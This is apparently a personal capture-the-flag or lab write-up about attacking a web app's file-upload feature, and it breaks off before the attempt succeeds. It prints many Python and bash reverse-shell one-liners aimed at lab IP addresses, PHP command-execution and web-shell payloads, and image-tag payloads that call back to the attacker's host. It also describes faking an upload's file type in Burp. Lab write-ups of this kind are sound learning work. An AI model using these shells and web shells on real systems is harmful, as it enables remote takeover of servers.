As after getting the homepage ip from the room page

![homepage](homepage_look.png)

After getting the roompage look we hit the ip in the browser.

Now after acessing the homepage into our browser

![homepage](homepage_1.png)

This was our first look of our target. Here tappable item were change the profile picture and type the messege  messege and send.

Now as we heard that we can uplaod something.

we did try with diffrent reverse shells with the listerner running **ncat -lvnp 1234** like 

reverse shell 1

```
export RHOST="10.49.145.217";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

``` 
Reverse shell 2

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.145.217",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

reverse shell 3

```
export RHOST="10.49.145.217";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

reverse shell 4

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.49.145.217",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

reverse shell 5

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.49.145.217",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```

reverse shell 6

```
import os,socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.29.213",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);
```

I uploaded each reverse shell file at the location of uploading the file.

But no one gave me a connection back.

Now we will hold our step back and try to attack back.

Now first of all before jumping straight into the reverse shell lets see its reacts to the payload we uplaod or not. if it reacts it can be feed with a rev shell.


So first we will see that it is making a impact or not by opening a python server with the command

```
python -m http.server 5555
```

And i then uplaoded the that html file

```html
<img src="http://YOUR_IP:5555/ping">

```


 and waited that am i getting a hit on my python server or not but still i didn't got the hit then i opened the source code and something unsuual it was the file location itself that i was not able to see after uploading the file.

```html
   
                <img src='/uploads/profile_44286c38-3bde-46f8-b7b3-e3b03a1651ff.html' class='profile-pic' alt='Profile Picture' 
                     onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22150%22 height=%22150%22%3E%3Ccircle cx=%2275%22 cy=%2275%22 r=%2275%22 fill=%22%23f48fb1%22/%3E%3Ctext x=%2250%25%22 y=%2250%25%22 text-anchor=%22middle%22 dy=%22.3em%22 fill=%22white%22 font-size=%2250%22%3E❤️%3C/text%3E%3C/svg%3E'">
                
```

Here in this text we could see the location of file in the url and when i opened the file in a new tab i got the hit.

So our mistake was taht after uploding the payload i was not trying to open the file.

So here we are going again with the payload that we tried above.

Payload 1

```
export RHOST="10.49.145.217";export RPORT=1234;python -c 'import
   sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2
   (s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

still didn't get the shell

Payload 2

```
export RHOST="10.49.145.217";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```
still didn't get the shell

Payload 3

```
export RHOST="192.168.164.54";export RPORT=1234;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

Still no shell.


Payload 4

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.164.54",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Still no shell

Payload 5

```
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.164.54",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
```
still no shell

Paylaod 6

```
import os,socket,subprocess;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("192.168.164.54",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/bash","-i"]);

```
still didn't worked

There is something  interesting i found that whenever i  uploads a php file and opens up the uploadded php files in a new tab it downloads the file instead of oopening it into a new tab.


I also tried some payload too but they also did not worked.

Some simple payloads are 

simple payload 1

```python
import os
os.system(bash -c bash -i >& /dev/tcp/192.168.164.54/1234 0>&1)

```

simple payload 2

```bash
/bin/bash -i >& /dev/tcp/192.168.29.213/1234 0>&1
```
simple payload 3

```php
<?php echo shell_exec(whoami); ?>
```

simple payload 4

```
<?php echo shell_exec(whoami); ?>
```
above one with a different name and a.jpg.php


since after uploading the file and opening it into a new tab doesn't download the files as the regular php files gets downloads instead it opens up into a new tab.


Our buddy chatgpt already confirmed that its a ssrf if the payload 

```
<img src="http://YOUR-IP:8000/test">
```

gets executed without opening the file in new tab after uploading it.

And if it is a xss then below will happens 

```
<img src="x" onerror="fetch('http://YOUR-IP:8000/xss')">

Watch your server logs.

Result:
You get a hit → browser executed JS (XSS)
```
and i can get the onerror only via the onerror

```
<img src="invalid.jpg" onerror="alert(1)">
```

Until the above writting i was on windows so this gave us a little pain. Now we have switced to our machine so we can continue now.

Now we're going to open burp and intercepting the req to change the filetype in the req.

Now we will upload this php file 

```
<?php system($_GET['cmd']); ?>
```

And change the file type to **image/jpeg** and see what happens..
